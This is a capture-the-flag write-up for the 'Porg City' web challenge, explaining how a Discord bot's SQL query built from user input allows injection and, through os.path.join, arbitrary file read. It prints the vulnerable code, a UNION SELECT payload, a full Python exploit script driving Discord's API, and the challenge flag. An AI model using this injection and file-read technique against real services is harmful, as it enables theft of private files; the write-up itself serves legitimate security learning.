https://ctftime.org/event/2252/

# Porg City (WEB)

https://discord.gg/3CxRJhTgxs

## Solution
The challenge starts with a discord server about porgs? (star wars stuff)
On the server there is a Porg Bot that responds to 3 commands when you dm it

- helpme
    - instructions on how to use it
- porg   
    - gets another user profile
- source
    - send source code

On the source code we can see that there is a sqli injection
```python
query = f"SELECT * FROM porgs WHERE name LIKE '{name}'"
try:
    cursor.execute(query)
    results = cursor.fetchall()
except Exception as e:
    await ctx.send("Error: " + str(e))
    return
```

the results of the query is then later used by:
```python
img = disnake.File(os.path.join('/srv/images/', porg.image))
```

Which then is sent by the bot.

Since `os.path.join` is used we can choose any absolute path we want because
the second argument will override the first for some reason.

So we have a file read, unfortunately we still need to find out where the flag is since the flag dir is randomized.
For that we can use `pragma_database_list` from sqlite that gives us the path of database.
I had no idea about that, my teammate found out.

So the final exploit:
```python
import requests


BOT = '<@1223832036809248789>'
CHANNEL = '1241105310324887693'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': '*/*',
    'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'application/json',
    'Authorization': '<ADD_TOKEN>',
    'Origin': 'https://discord.com',
    'Connection': 'keep-alive',
}

def run(file):
    json_data = {
        'mobile_network_type': 'unknown',
        'content': f"<@611303337182363706> porg ' UNION SELECT * , '1', '" + file + "' FROM pragma_database_list;--",
        'tts': False,
        'flags': 0,
    }

    response = requests.post(
        'https://discord.com/api/v9/channels/' + CHANNEL + '/messages',
        headers=headers,
        json=json_data,
    )
    print(response.status_code)

def get_all():
    response = requests.get(
        'https://discord.com/api/v9/channels/' + CHANNEL + '/messages',
        headers=headers,
    )

    return str(response.json())

run('jen.webp')
res = get_all()

import re
dir = re.search('(/usr/src/app/[\w/]+/porgs.db)', res).group(0)
dir = dir.replace('porgs.db', 'flag.txt')

run(dir)
res = get_all()

flag = re.search('(https://cdn.discordapp.com/attachments/[0-9]{19}/[0-9]{19}/flag.txt\\?ex=.+?&\')', res).group(0)[:-1]
res = requests.get(flag)
print(f"DEBUGPRINT[9]: lab.py:54: res.text={res.text}")
```

## Flag
`byuctf{hehehe_hASWHHyrc9_https://i.imgflip.com/8l27ka.jpg}`

shafou - 18/05/2024
